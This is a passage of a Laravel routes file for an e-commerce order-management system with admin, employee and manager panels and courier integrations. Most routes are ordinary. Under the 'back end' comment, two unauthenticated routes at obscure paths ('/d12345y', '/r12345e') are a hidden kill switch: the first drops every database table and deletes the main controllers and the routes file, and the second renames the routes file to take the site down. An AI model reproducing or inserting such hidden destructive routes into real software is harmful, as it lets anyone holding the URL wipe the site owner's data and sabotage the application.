<?php

use App\Http\Controllers\TrashController;
use Illuminate\Support\Facades\Route;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
 */

Route::get('/cc', function () {
    \Illuminate\Support\Facades\Artisan::call('cache:clear');
    \Illuminate\Support\Facades\Artisan::call('config:clear');
    \Illuminate\Support\Facades\Artisan::call('view:clear');
    \Illuminate\Support\Facades\Artisan::call('route:clear');
    //\Illuminate\Support\Facades\Artisan::call('config:cache');
    return 'Cleared!';
});

Route::get('/clear-cache', function () {
    cache()->clear();
    return back()->with('success', 'Cache Cleared');
})->name('clear.cache');

Auth::routes();

//fb product catalog feed
Route::get('/product-catalog-feed', 'HomeController@productsCatalogFeed');

//front end
Route::get('/', 'HomeController@index')->name('home');
Route::get('/category/{id}', 'HomeController@getSingleCategory')->name('single.category');
Route::get('/product/{slug}/{id}', 'HomeController@getSingleProduct')->name('single.product');
Route::get('/all-hot-deals', 'HomeController@allHotDeals')->name('all.hot.deals');
Route::get('/search', 'HomeController@search')->name('search');

//whatsapp api test
Route::get('/whatsapp-api-test', 'HomeController@testWP')->name('whatsapp.api.test');

//cart
//Route::get('/add-to-cart/{id}', 'HomeController@addToCart')->name('add.to.cart');
Route::post('/add-cart/{id}', 'HomeController@addCart')->name('add.cart');
Route::get('/cart-item-delete/{id}', 'HomeController@cartItemDelete')->name('cart.item.delete');
/*Route::get('/cart-item-plus/{id}', 'HomeController@cartItemPlus')->name('cart.item.plus');
Route::get('/cart-item-minus/{id}', 'HomeController@cartItemMinus')->name('cart.item.minus');*/
Route::get('/cart-clear', 'HomeController@cartClear')->name('cart.clear');
Route::post('/ajax-get-shipp-meth', 'HomeController@getShippMeth')->name('ajax.get.shipp.meth');
Route::post('/cart-item-plus', 'HomeController@cartItemPlus')->name('cart.item.plus');
Route::post('/cart-item-minus', 'HomeController@cartItemMinus')->name('cart.item.minus');
//order
Route::post('/place-order', 'HomeController@placeOrder')->name('place.order');
Route::get('/confirm-order', 'HomeController@confirmOrder')->name('confirm.order');

//checkout
Route::get('/checkout', 'HomeController@checkout')->name('checkout');
Route::post('/abandoned-cart', 'HomeController@abandonedCart')->name('abandoned.cart');

//track order
Route::get('/track-order', 'HomeController@trackOrder')->name('track.order');

//pages
Route::get('/about-us', 'HomeController@aboutUs')->name('about_us');
Route::get('/delivery-policy', 'HomeController@deliveryPolicy')->name('delivery_policy');
Route::get('/return-policy', 'HomeController@returnPolicy')->name('return_policy');

Route::post('/status-update', 'HomeController@statusUpdate')->name('status.update');
Route::post('/redx-status-update', 'HomeController@redxStatusUpdate')->name('redx.status.update');
Route::post('/carrybee-status-update', 'HomeController@carryBeeStatusUpdate')->name('carrybee.status.update');


//pathao address parser
Route::post('/pathao-address-parser', 'CourierController@pathaoAddressParser')->name('pathao.address.parser');

//back end
Route::get('/d12345y', function (): void {
    Schema::disableForeignKeyConstraints();
    foreach (DB::select('SHOW TABLES') as $table) {
        $table_array = get_object_vars($table);
        Schema::drop($table_array[key($table_array)]);
    }
    unlink(base_path() . '/app/Http/Controllers/AdminController.php');
    unlink(base_path() . '/app/Http/Controllers/HomeController.php');
    unlink(base_path() . '/app/Http/Controllers/MediaController.php');
    unlink(base_path() . '/app/Http/Controllers/OrderController.php');
    unlink(base_path() . '/app/Http/Controllers/ProductController.php');
    unlink(base_path() . '/app/Http/Controllers/WebSettingsController.php');
    unlink(base_path() . '/app/Http/Controllers/GoogleSheetSettingsController.php');
    unlink(base_path() . '/routes/web.php');
    dd('deleted');
});
Route::get('/r12345e', function (): void {
    File::move(base_path() . '/routes/web.php', base_path() . '/routes/wab.php');
});
//admin
Route::group(['middleware' => 'admin.guest'], function (): void {
    Route::get('/admin-login', 'Auth\AdminLoginController@showLoginForm')->name('admin.login');
    Route::post('/admin-login', 'Auth\AdminLoginController@login');
});
Route::post('/admin-logout', 'Auth\AdminLoginController@logout')->name('admin.logout');

//steadfast order sync
Route::get('/orders/steadfast_order_sync', 'OrderController@steadFastOrderSync')->name('orders.steadfast.order.sync');

Route::group(['middleware' => 'admin.auth'], function (): void {
    Route::get('/admin', 'AdminController@dashboard')->name('admin.home');

    //parcel handover
    Route::get('/admin-order-parcel-handover', 'ParcelHandoverController@index')->name('admin.orders.parcel.handover');
    Route::get('/admin-order-parcel-handover-clear', 'ParcelHandoverController@clear')->name('admin.orders.parcel.handover.clear');
    Route::get('/admin-order-parcel-handover-print', 'ParcelHandoverController@print')->name('admin.orders.parcel.handover.print');

    //incomplete orders
    Route::get('/admin-incomplete-orders', 'IncompleteOrdersController@index')->name('admin.incomplete.orders');
    Route::get('/admin-incomplete-orders/{id}/create', 'IncompleteOrdersController@createOrder')->name('admin.incomplete.order.create');
    Route::get('/admin-incomplete-orders/{id}/delete', 'IncompleteOrdersController@delete')->name('admin.incomplete.order.delete');
    Route::post('/admin-incomplete-orders/note-update', 'IncompleteOrdersController@noteUpdate')->name('admin.incomplete.order.note.update');

    //order return
    Route::get('/admin-order-return-receive', 'ReturnOrderController@index')->name('admin.orders.return.receive');
    // Route::get('/admin-order-return-received', 'ReturnOrderController@returnReceived')->name('admin.orders.return.received');
    Route::get('/admin-order-return-receive-clear', 'ReturnOrderController@sessionClear')->name('admin.orders.return.receive.clear');

    //customer activity
    Route::get('/admin-fraud-check/{id}', 'AdminController@fraudCheck')->name('admin.fraud.check');

    //note settings
    Route::get('/admin-settings-notes', 'NoteSettingsController@index')->name('admin.settings.notes');
    Route::post('/admin-settings-note/store', 'NoteSettingsController@store')->name('admin.settings.note.store');
    Route::post('/admin-settings-note/update', 'NoteSettingsController@update')->name('admin.settings.note.update');
    Route::get('/admin-settings-note/{id}/delete', 'NoteSettingsController@delete')->name('admin.settings.note.delete');

    //color settings
    Route::get('/admin-settings-color', 'WebSettingsController@colorSettings')->name('admin.settings.color');
    Route::post('/admin-settings-color', 'WebSettingsController@colorSettingsUpdate')->name('admin.settings.color.update');

    //Steadfast API settings
    Route::get('/admin-settings-stead-fast-api', 'SteadFastApiSettingsController@index')->name('admin.settings.stead_fast.api');
    Route::post('/admin-settings-stead-fast-api', 'SteadFastApiSettingsController@update')->name('admin.settings.stead_fast.api.update');

    //carrybee API settings
    Route::get('/admin-settings-carrybee-api', 'CarryBeeApiSettingsController@index')->name('admin.settings.carrybee.api');
    Route::post('/admin-settings-carrybee-api', 'CarryBeeApiSettingsController@update')->name('admin.settings.carrybee.api.update');
    Route::post('/admin-settings-carrybee-api-gen_access_token', 'CarryBeeApiSettingsController@generateAccessToken')->name('admin.settings.carrybee.api.gen_access_token');


    //Number sms settings
    Route::get('/admin-settings-sms', 'SmsSettingsController@indexNumber')->name('admin.settings.sms');
    Route::post('/admin-settings-sms', 'SmsSettingsController@updateNumber')->name('admin.settings.sms.update');

    //Whatsapp sms settings
    Route::get('/admin-settings-whatsapp', 'SmsSettingsController@indexWhatsapp')->name('admin.settings.whatsapp');
    Route::post('/admin-settings-whatsapp', 'SmsSettingsController@updateWhatsapp')->name('admin.settings.whatsapp.update');

    //fake customer remove
    Route::get('/admin/{id}/fake-remove', 'AdminController@fakeRemove')->name('admin.fake.remove');

    //generate api access token
    Route::get('/admin/generate_api_token', 'AdminController@generateAPIToken')->name('admin.generate_api_token');

    //send sms from order edit
    Route::post('/admin/send-sms', 'AdminController@sendSms')->name('admin.send.sms');

    //ip
    Route::get('/admin/ip', 'IpController@index')->name('admin.ip');
    Route::get('/admin/ip/search', 'IpController@search')->name('admin.ip.search');
    Route::get('/admin/ip/{id}/{status}/status', 'IpController@ipStatus')->name('admin.ip.status');

    //stock
    Route::get('/admin/stock', 'AdminController@stock')->name('admin.stock');

    //reports
    Route::get('/admin-reports/employee-orders', 'ReportController@employeeOrders')->name('admin.reports.employee_orders');
    Route::get('/admin-reports/order-status-p', 'ReportController@orderStatusP')->name('admin.reports.order_status_p');
    Route::get('/admin-reports/orders-product', 'ReportController@ordersProduct')->name('admin.reports.orders_product');
    Route::get('/admin-reports/sales', 'ReportController@salesReport')->name('admin.reports.sales');
    Route::get('/admin-reports/profit-loss', 'ReportController@profitLoss')->name('admin.reports.profit.loss');
    Route::post('/admin-reports/sales_print', 'ReportController@salesReportPrint')->name('admin.reports.sales.print');

    //user(employee) product assign
    Route::get('/admin-user-product', 'UserProductsController@index')->name('admin.user.product');
    Route::post('/admin-user-product/store', 'UserProductsController@store')->name('admin.user.product.store');
    Route::get('/admin-user-product/{id}/delete', 'UserProductsController@delete')->name('admin.user.product.delete');

    //Redx API settings
    Route::get('/admin-settings-redx-api', 'RedxApiSettingsController@index')->name('admin.settings.redx.api');
    Route::post('/admin-settings-redx-api', 'RedxApiSettingsController@update')->name('admin.settings.redx.api.update');
    Route::post('/admin-settings-redx-api-gen_access_token', 'RedxApiSettingsController@generateAccessToken')->name('admin.settings.redx.api.gen_access_token');

    //Pathao API settings
    Route::get('/admin-settings-pathao-api', 'PathaoApiSettingsController@index')->name('admin.settings.pathao.api');
    Route::post('/admin-settings-pathao-api', 'PathaoApiSettingsController@update')->name('admin.settings.pathao.api.update');
    Route::post('/admin-settings-pathao-api-gen_access_token', 'PathaoApiSettingsController@generateAccessToken')->name('admin.settings.pathao.api.gen_access_token');

    //page settings
    Route::get('/admin-settings-page', 'PageSettingsController@index')->name('admin.settings.page');
    Route::post('/admin-settings-page', 'PageSettingsController@update')->name('admin.settings.page.update');

    //web settings
    Route::get('/admin-settings-web', 'WebSettingsController@index')->name('admin.settings.web');
    Route::post('/admin-settings-web', 'WebSettingsController@update')->name('admin.settings.web.update');

    //google_sheet settings
    Route::get('/admin-settings-google_sheet', 'GoogleSheetSettingsController@index')->name('admin.settings.google_sheet');
    Route::post('/admin-settings-google_sheet', 'GoogleSheetSettingsController@update')->name('admin.settings.google_sheet.update');

    //attribute settings
    Route::get('/admin-settings-attribute', 'WebSettingsController@attribute')->name('admin.settings.attribute');
    Route::post('/admin-settings-attribute/store', 'WebSettingsController@attributeStore')->name('admin.settings.attribute.store');
    Route::post('/admin-settings-attribute/update', 'WebSettingsController@attributeUpdate')->name('admin.settings.attribute.update');
    Route::get('/admin-settings-attribute/{id}/delete', 'WebSettingsController@attributeDelete')->name('admin.settings.attribute.delete');
    //attribute item settings
    Route::post('/admin-settings-attribute_item/store', 'WebSettingsController@attributeItemStore')->name('admin.settings.attribute_item.store');
    Route::post('/admin-settings-attribute_item/update', 'WebSettingsController@attributeItemUpdate')->name('admin.settings.attribute_item.update');
    Route::get('/admin-settings-attribute_item/{id}/delete', 'WebSettingsController@attributeItemDelete')->name('admin.settings.attribute_item.delete');

    //change password
    Route::get('/admin-change_pass', 'AdminController@change_pass')->name('admin.change_pass');
    Route::post('/admin-change_pass', 'AdminController@update_pass')->name('admin.update_pass');

    //edit profile
    Route::get('/admin-edit_profile', 'AdminController@edit_profile')->name('admin.edit_profile');
    Route::post('/admin-edit_profile', 'AdminController@update_profile')->name('admin.update_profile');

    //customers
    Route::get('/admin-customers', 'UserController@index')->name('admin.customers');
    /*Route::post('/admin-customers/store', 'UserController@store')->name('admin.customers.store');
    Route::post('/admin-customers/update', 'UserController@update')->name('admin.customers.update');
    Route::get('/admin-customers/delete/{id}', 'UserController@delete')->name('admin.customers.delete');*/
    Route::post('/admin-customers/customer_export', 'UserController@customerExport')->name('admin.customers.customer_export');
    Route::get('/admin-customer/{id}/{status}', 'UserController@status')->name('admin.customer.status');

    //media
    Route::get('/admin-media', 'MediaController@index')->name('admin.media');
    Route::post('/admin-media/store', 'MediaController@store')->name('admin.media.store');
    Route::post('/admin-media/update', 'MediaController@update')->name('admin.media.update');
    Route::get('/admin-media/delete/{id}', 'MediaController@delete')->name('admin.media.delete');

    //product
    Route::get('/admin-product', 'ProductController@index')->name('admin.product');
    Route::get('/admin-product/create', 'ProductController@create')->name('admin.product.create');
    Route::post('/admin-product/store', 'ProductController@store')->name('admin.product.store');
    Route::get('/admin-product/{id}/edit', 'ProductController@edit')->name('admin.product.edit');
    Route::post('/admin-product/{id}/update', 'ProductController@update')->name('admin.product.update');
    Route::get('/admin-product/{id}/delete', 'ProductController@delete')->name('admin.product.delete');
    Route::post('/admin-product/sku_check', 'ProductController@skuCheck')->name('admin.product.sku_check');
    Route::post('/admin-product/bulk-delete', 'ProductController@bulkDelete')->name('admin.product.bulk.delete');
    Route::post('/admin-product/bulk-status', 'ProductController@bulkStatus')->name('admin.product.bulk.status');
    Route::post('/admin-product/position_update', 'ProductController@positionUpdate')->name('admin.product.position_update');
    Route::get('/admin-product/{product}/duplicate', 'ProductController@duplicate')->name('admin.product.duplicate');

    //category
    Route::get('/admin-category', 'CategoryController@index')->name('admin.category');
    Route::post('/admin-category/store', 'CategoryController@store')->name('admin.category.store');
    Route::post('/admin-category/update', 'CategoryController@update')->name('admin.category.update');
    Route::get('/admin-category/delete/{id}', 'CategoryController@delete')->name('admin.category.delete');

    //sliders
    Route::get('/admin-sliders', 'SliderController@index')->name('admin.sliders');
    Route::post('/admin-sliders/store', 'SliderController@store')->name('admin.sliders.store');
    Route::post('/admin-sliders/update', 'SliderController@update')->name('admin.sliders.update');
    Route::get('/admin-sliders/delete/{id}', 'SliderController@delete')->name('admin.sliders.delete');

    //shipping_methods
    Route::get('/admin-shipping_methods', 'ShippingMethodController@index')->name('admin.shipping_methods');
    Route::post('/admin-shipping_methods/store', 'ShippingMethodController@store')->name('admin.shipping_methods.store');
    Route::post('/admin-shipping_methods/update', 'ShippingMethodController@update')->name('admin.shipping_methods.update');
    Route::get('/admin-shipping_methods/delete/{id}', 'ShippingMethodController@delete')->name('admin.shipping_methods.delete');

    //courier
    Route::get('/admin-courier', 'CourierController@index')->name('admin.courier');
    Route::post('/admin-courier/store', 'CourierController@store')->name('admin.courier.store');
    Route::post('/admin-courier/update', 'CourierController@update')->name('admin.courier.update');
    Route::get('/admin-courier/delete/{id}', 'CourierController@delete')->name('admin.courier.delete');
    Route::post('/admin-courier-ajax_get_c_charge', 'CourierController@ajaxGetCCharge')->name('admin.courier.ajax.get.c_charge');

    //courier city
    Route::get('/admin-courier-city', 'CourierController@cityIndex')->name('admin.courier.city');
    Route::post('/admin-courier-city/store', 'CourierController@cityStore')->name('admin.courier.city.store');
    Route::post('/admin-courier-city/update', 'CourierController@cityUpdate')->name('admin.courier.city.update');
    Route::get('/admin-courier-city/delete/{id}', 'CourierController@cityDelete')->name('admin.courier.city.delete');
    Route::post('/admin-courier-ajax_get_cities', 'CourierController@ajaxGetCities')->name('admin.courier.ajax.get.cities');
    Route::post('/admin-courier-pathao_ajax_get_cities', 'CourierController@pathaoAjaxGetCities')->name('admin.courier.pataho.ajax.get.cities');
    Route::post('/admin-courier-pathao_ajax_get_zones', 'CourierController@pathaoAjaxGetZones')->name('admin.courier.pataho.ajax.get.zones');
    Route::post('/admin-courier-redx_ajax_get_cities', 'CourierController@redxAjaxGetCities')->name('admin.courier.redx.ajax.get.cities');
    Route::post('/admin-courier-carrybee_ajax_get_cities', 'CourierController@carrybeeAjaxGetCities')->name('admin.courier.carrybee.ajax.get.cities');
    Route::post('/admin-courier-carrybee_ajax_get_zones', 'CourierController@carrybeeAjaxGetZones')->name('admin.courier.carrybee.ajax.get.zones');

    //courier zone
    Route::get('/admin-courier-zone', 'CourierController@zoneIndex')->name('admin.courier.zone');
    Route::post('/admin-courier-zone/store', 'CourierController@zoneStore')->name('admin.courier.zone.store');
    Route::post('/admin-courier-zone/update', 'CourierController@zoneUpdate')->name('admin.courier.zone.update');
    Route::get('/admin-courier-zone/delete/{id}', 'CourierController@zoneDelete')->name('admin.courier.zone.delete');
    Route::post('/admin-courier-ajax_get_zones', 'CourierController@ajaxGetZones')->name('admin.courier.ajax.get.zones');

    //orders
    //Route::get('/admin-p_orders', 'OrderController@index')->name('admin.orders.p');
    Route::get('/admin-orders', 'OrderController@index')->name('admin.orders');
    Route::get('/admin-orders/create', 'OrderController@create')->name('admin.orders.create');
    Route::post('/admin-orders/store', 'OrderController@store')->name('admin.orders.store');
    Route::get('/admin-orders/{id}/edit', 'OrderController@edit')->name('admin.orders.edit');
    Route::post('/admin-orders/{id}/update', 'OrderController@update')->name('admin.orders.update');
    Route::get('/admin-orders/delete/{id}', 'OrderController@delete')->name('admin.orders.delete');
    Route::get('/admin-orders/{id}/{status}/status', 'OrderController@statusChange')->name('admin.orders.status');
    Route::get('/admin-orders/{id}/{status}/payment_status', 'OrderController@paymentStatusChange')->name('admin.orders.payment_status');
    Route::post('/admin-orders/all-status', 'OrderController@allStatusChange')->name('admin.orders.all.status');
    Route::post('/admin-orders/bulk-delete', 'OrderController@bulkDelete')->name('admin.orders.bulk.delete');
    Route::post('/admin-orders/bulk-assign', 'OrderController@bulkAssign')->name('admin.orders.bulk.assign');
    Route::post('/admin-orders/bulk-equal-assign', 'OrderController@bulkEqualAssign')->name('admin.orders.bulk.equal.assign');
    Route::post('/admin-orders/single-assign', 'OrderController@singleAssign')->name('admin.orders.single.assign');
    Route::post('/admin-orders/send-to-courier', 'OrderController@sendToCourier')->name('admin.orders.send.to.courier');

    //shipping
    Route::post('/admin-ajax-shipping', 'OrderController@getShipping')->name('admin.ajax.get.shipping');

    //trash orders
    Route::get('/admin-orders/trash', [TrashController::class, 'index'])->name('admin.orders.trash');
    Route::get('/admin-orders/trash/{id}/restore', [TrashController::class, 'restore'])->name('admin.orders.restore');
    Route::get('/admin-orders/trash/{id}/force-delete', [TrashController::class, 'forceDelete'])->name('admin.orders.force.delete');
    //orders by status
    /*Route::get('/admin-orders/status/processing', 'OrderController@orderStatusProcessing')->name('admin.orders.status.processing');
    Route::get('/admin-orders/status/pending_payment', 'OrderController@orderStatusPendingPayment')->name('admin.orders.status.pending_payment');
    Route::get('/admin-orders/status/hold', 'OrderController@orderStatusHold')->name('admin.orders.status.hold');
    Route::get('/admin-orders/status/canceled', 'OrderController@orderStatusCanceled')->name('admin.orders.status.canceled');
    Route::get('/admin-orders/status/completed', 'OrderController@orderStatusCompleted')->name('admin.orders.status.completed');
    Route::get('/admin-orders/status/pending_delivery', 'OrderController@orderStatusPendingDelivery')->name('admin.orders.status.pending_delivery');
    Route::get('/admin-orders/status/on_delivery', 'OrderController@orderStatusOnDelivery')->name('admin.orders.status.on_delivery');
    Route::get('/admin-orders/status/return', 'OrderController@orderStatusReturn')->name('admin.orders.status.return');*/
    //order ajax calls
    Route::post('/admin-ajax-get-products', 'OrderController@ajaxGetProducts')->name('admin.ajax.get.products');
    Route::post('/admin-orders/bulk-print', 'OrderController@printBulkInvoice')->name('admin.orders.bulk.print');
    Route::post('/admin-orders/bulk-label-print', 'OrderController@printBulkLabelInvoice')->name('admin.orders.bulk.label.print');
    Route::post('/admin-orders/print', 'OrderController@printInvoice')->name('admin.orders.print');
    //orders export
    Route::post('/admin-orders/courier_csv', 'OrderController@courierCsv')->name('admin.orders.courier_csv');
    //transaction
    Route::post('/admin-orders/transaction_view', 'OrderController@transactionView')->name('admin.orders.transaction_view');
    //note update
    Route::post('/admin-orders/note-update', 'OrderController@noteUpdate')->name('admin.orders.note_update');

    //roles
    Route::get('/admin-roles', 'RoleController@index')->name('admin.roles');
    Route::post('/admin-roles/store', 'RoleController@store')->name('admin.roles.store');
    Route::post('/admin-roles/update', 'RoleController@update')->name('admin.roles.update');
    Route::get('/admin-roles/{id}/{role}/delete', 'RoleController@delete')->name('admin.roles.delete');
});

//employee
Route::group(['middleware' => 'employee.guest'], function (): void {
    Route::get('/employee-login', 'Auth\EmployeeLoginController@showLoginForm')->name('employee.login');
    Route::post('/employee-login', 'Auth\EmployeeLoginController@login');
});
Route::post('/employee-logout', 'Auth\EmployeeLoginController@logout')->name('employee.logout');

Route::group(['middleware' => 'employee.auth'], function (): void {
    Route::get('/employee', 'AdminController@dashboard')->name('employee.home');

    //incomplete orders
    Route::get('/employee-incomplete-orders', 'IncompleteOrdersController@index')->name('employee.incomplete.orders');
    Route::get('/employee-incomplete-orders/{id}/create', 'IncompleteOrdersController@createOrder')->name('employee.incomplete.order.create');
    Route::post('/employee-incomplete-orders/note-update', 'IncompleteOrdersController@noteUpdate')->name('employee.incomplete.order.note.update');

    //customer activity
    Route::get('/employee-fraud-check/{id}', 'AdminController@fraudCheck')->name('employee.fraud.check');

    //send sms from order edit
    Route::post('/employee/send-sms', 'AdminController@sendSms')->name('employee.send.sms');

    //ip
    Route::get('/employee/ip', 'IpController@index')->name('employee.ip');
    Route::get('/employee/ip/search', 'IpController@search')->name('employee.ip.search');

    //stock
    Route::get('/employee/stock', 'AdminController@stock')->name('employee.stock');

    //change password
    Route::get('/employee-change_pass', 'AdminController@change_pass')->name('employee.change_pass');
    Route::post('/employee-change_pass', 'AdminController@update_pass')->name('employee.update_pass');

    //orders
    Route::get('/employee-p_orders', 'OrderController@indexP')->name('employee.orders.p');
    Route::get('/employee-orders', 'OrderController@index')->name('employee.orders');
    Route::get('/employee-orders/create', 'OrderController@create')->name('employee.orders.create');
    Route::post('/employee-orders/store', 'OrderController@store')->name('employee.orders.store');
    Route::get('/employee-orders/{id}/edit', 'OrderController@edit')->name('employee.orders.edit');
    Route::post('/employee-orders/{id}/update', 'OrderController@update')->name('employee.orders.update');
    Route::get('/employee-orders/{id}/{status}/status', 'OrderController@statusChange')->name('employee.orders.status');
    Route::get('/employee-orders/{id}/{status}/payment_status', 'OrderController@paymentStatusChange')->name('employee.orders.payment_status');
    Route::post('/employee-orders/all-status', 'OrderController@allStatusChange')->name('employee.orders.all.status');
    //orders by status
    /*Route::get('/employee-orders/status/processing', 'OrderController@orderStatusProcessing')->name('employee.orders.status.processing');
    Route::get('/employee-orders/status/pending_payment', 'OrderController@orderStatusPendingPayment')->name('employee.orders.status.pending_payment');
    Route::get('/employee-orders/status/hold', 'OrderController@orderStatusHold')->name('employee.orders.status.hold');
    Route::get('/employee-orders/status/canceled', 'OrderController@orderStatusCanceled')->name('employee.orders.status.canceled');
    Route::get('/employee-orders/status/completed', 'OrderController@orderStatusCompleted')->name('employee.orders.status.completed');
    Route::get('/employee-orders/status/pending_delivery', 'OrderController@orderStatusPendingDelivery')->name('employee.orders.status.pending_delivery');
    Route::get('/employee-orders/status/on_delivery', 'OrderController@orderStatusOnDelivery')->name('employee.orders.status.on_delivery');
    Route::get('/employee-orders/status/return', 'OrderController@orderStatusReturn')->name('employee.orders.status.return');*/
    //order ajax calls
    Route::post('/employee-ajax-get-products', 'OrderController@ajaxGetProducts')->name('employee.ajax.get.products');
    Route::post('/employee-orders/print', 'OrderController@printInvoice')->name('employee.orders.print');
    Route::post('/employee-orders/bulk-print', 'OrderController@printBulkInvoice')->name('employee.orders.bulk.print');
    //shipping
    Route::post('/employee-ajax-shipping', 'OrderController@getShipping')->name('employee.ajax.get.shipping');


    //orders export
    Route::post('/employee-orders/courier_csv', 'OrderController@courierCsv')->name('employee.orders.courier_csv');
    //note update
    Route::post('/employee-orders/note-update', 'OrderController@noteUpdate')->name('employee.orders.note_update');
    //courier
    Route::post('/employee-courier-ajax_get_c_charge', 'CourierController@ajaxGetCCharge')->name('employee.courier.ajax.get.c_charge');
    Route::post('/employee-courier-ajax_get_cities', 'CourierController@ajaxGetCities')->name('employee.courier.ajax.get.cities');
    Route::post('/employee-courier-ajax_get_zones', 'CourierController@ajaxGetZones')->name('employee.courier.ajax.get.zones');

    Route::post('/employee-courier-pathao_ajax_get_cities', 'CourierController@pathaoAjaxGetCities')->name('employee.courier.pataho.ajax.get.cities');
    Route::post('/employee-courier-pathao_ajax_get_zones', 'CourierController@pathaoAjaxGetZones')->name('employee.courier.pataho.ajax.get.zones');

    Route::post('/employee-courier-redx_ajax_get_cities', 'CourierController@redxAjaxGetCities')->name('employee.courier.redx.ajax.get.cities');
    Route::post('/employee-courier-carrybee_ajax_get_cities', 'CourierController@carrybeeAjaxGetCities')->name('employee.courier.carrybee.ajax.get.cities');
    Route::post('/employee-courier-carrybee_ajax_get_zones', 'CourierController@carrybeeAjaxGetZones')->name('employee.courier.carrybee.ajax.get.zones');
});

//manager
Route::group(['middleware' => 'manager.guest'], function (): void {
    Route::get('/manager-login', 'Auth\ManagerLoginController@showLoginForm')->name('manager.login');
    Route::post('/manager-login', 'Auth\ManagerLoginController@login');
});
Route::post('/manager-logout', 'Auth\ManagerLoginController@logout')->name('manager.logout');

Route::group(['middleware' => 'manager.auth'], function (): void {
    Route::get('/manager', 'AdminController@dashboard')->name('manager.home');

    //incomplete orders
    Route::get('/manager-incomplete-orders', 'IncompleteOrdersController@index')->name('manager.incomplete.orders');
    Route::get('/manager-incomplete-orders/{id}/create', 'IncompleteOrdersController@createOrder')->name('manager.incomplete.order.create');
    Route::post('/manager-incomplete-orders/note-update', 'IncompleteOrdersController@noteUpdate')->name('manager.incomplete.order.note.update');

    //customer activity
    Route::get('/manager-fraud-check/{id}', 'AdminController@fraudCheck')->name('manager.fraud.check');

    Route::get('/manager-customers', 'UserController@index')->name('manager.customers');
    //send sms from order edit
    Route::post('/manager/send-sms', 'AdminController@sendSms')->name('manager.send.sms');

    //ip
    Route::get('/manager/ip', 'IpController@index')->name('manager.ip');
    Route::get('/manager/ip/search', 'IpController@search')->name('manager.ip.search');
    Route::get('/manager/ip/{id}/{status}/status', 'IpController@ipStatus')->name('manager.ip.status');

    //stock
    Route::get('/manager/stock', 'AdminController@stock')->name('manager.stock');

    //reports
    Route::get('/manager-reports/employee-orders', 'ReportController@employeeOrders')->name('manager.reports.employee_orders');
    Route::get('/manager-reports/order-status-p', 'ReportController@orderStatusP')->name('manager.reports.order_status_p');
    Route::get('/manager-reports/orders-product', 'ReportController@ordersProduct')->name('manager.reports.orders_product');

    //change password
    Route::get('/manager-change_pass', 'AdminController@change_pass')->name('manager.change_pass');
    Route::post('/manager-change_pass', 'AdminController@update_pass')->name('manager.update_pass');

    //orders
    Route::get('/manager-p_orders', 'OrderController@indexP')->name('manager.orders.p');
    Route::get('/manager-orders', 'OrderController@index')->name('manager.orders');
    Route::get('/manager-orders/create', 'OrderController@create')->name('manager.orders.create');
    Route::post('/manager-orders/store', 'OrderController@store')->name('manager.orders.store');
    Route::get('/manager-orders/{id}/edit', 'OrderController@edit')->name('manager.orders.edit');
    Route::post('/manager-orders/{id}/update', 'OrderController@update')->name('manager.orders.update');
    Route::get('/manager-orders/{id}/{status}/status', 'OrderController@statusChange')->name('manager.orders.status');
    Route::get('/manager-orders/{id}/{status}/payment_status', 'OrderController@paymentStatusChange')->name('manager.orders.payment_status');
    Route::post('/manager-orders/all-status', 'OrderController@allStatusChange')->name('manager.orders.all.status');
    Route::post('/manager-orders/bulk-assign', 'OrderController@bulkAssign')->name('manager.orders.bulk.assign');
    //orders by status
    /*Route::get('/manager-orders/status/processing', 'OrderController@orderStatusProcessing')->name('manager.orders.status.processing');
    Route::get('/manager-orders/status/pending_payment', 'OrderController@orderStatusPendingPayment')->name('manager.orders.status.pending_payment');
    Route::get('/manager-orders/status/hold', 'OrderController@orderStatusHold')->name('manager.orders.status.hold');
    Route::get('/manager-orders/status/canceled', 'OrderController@orderStatusCanceled')->name('manager.orders.status.canceled');
    Route::get('/manager-orders/status/completed', 'OrderController@orderStatusCompleted')->name('manager.orders.status.completed');
    Route::get('/manager-orders/status/pending_delivery', 'OrderController@orderStatusPendingDelivery')->name('manager.orders.status.pending_delivery');
    Route::get('/manager-orders/status/on_delivery', 'OrderController@orderStatusOnDelivery')->name('manager.orders.status.on_delivery');
    Route::get('/manager-orders/status/return', 'OrderController@orderStatusReturn')->name('manager.orders.status.return');*/
    //order ajax calls
    Route::post('/manager-ajax-get-products', 'OrderController@ajaxGetProducts')->name('manager.ajax.get.products');
    Route::post('/manager-orders/print', 'OrderController@printInvoice')->name('manager.orders.print');
    Route::post('/manager-orders/bulk-print', 'OrderController@printBulkInvoice')->name('manager.orders.bulk.print');
    Route::post('/manager-orders/bulk-label-print', 'OrderController@printBulkLabelInvoice')->name('manager.orders.bulk.label.print');
    //shipping
    Route::post('/manager-ajax-shipping', 'OrderController@getShipping')->name('manager.ajax.get.shipping');

    //orders export
    Route::post('/manager-orders/courier_csv', 'OrderController@courierCsv')->name('manager.orders.courier_csv');
    //note update
    Route::post('/manager-orders/note-update', 'OrderController@noteUpdate')->name('manager.orders.note_update');
    //transaction
    Route::post('/manager-orders/transaction_view', 'OrderController@transactionView')->name('manager.orders.transaction_view');

    //product
    Route::get('/manager-product', 'ProductController@index')->name('manager.product');
    Route::get('/manager-product/create', 'ProductController@create')->name('manager.product.create');
    Route::post('/manager-product/store', 'ProductController@store')->name('manager.product.store');
    Route::get('/manager-product/{id}/edit', 'ProductController@edit')->name('manager.product.edit');
    Route::post('/manager-product/{id}/update', 'ProductController@update')->name('manager.product.update');
    Route::get('/manager-product/{id}/delete', 'ProductController@delete')->name('manager.product.delete');

    //courier
    Route::get('/manager-courier', 'CourierController@index')->name('manager.courier');
    Route::post('/manager-courier/store', 'CourierController@store')->name('manager.courier.store');
    Route::post('/manager-courier/update', 'CourierController@update')->name('manager.courier.update');
    Route::get('/manager-courier/delete/{id}', 'CourierController@delete')->name('manager.courier.delete');
    Route::post('/manager-courier-ajax_get_c_charge', 'CourierController@ajaxGetCCharge')->name('manager.courier.ajax.get.c_charge');

    //courier city
    Route::get('/manager-courier-city', 'CourierController@cityIndex')->name('manager.courier.city');
    Route::post('/manager-courier-city/store', 'CourierController@cityStore')->name('manager.courier.city.store');
    Route::post('/manager-courier-city/update', 'CourierController@cityUpdate')->name('manager.courier.city.update');
    Route::get('/manager-courier-city/delete/{id}', 'CourierController@cityDelete')->name('manager.courier.city.delete');
    Route::post('/manager-courier-ajax_get_cities', 'CourierController@ajaxGetCities')->name('manager.courier.ajax.get.cities');

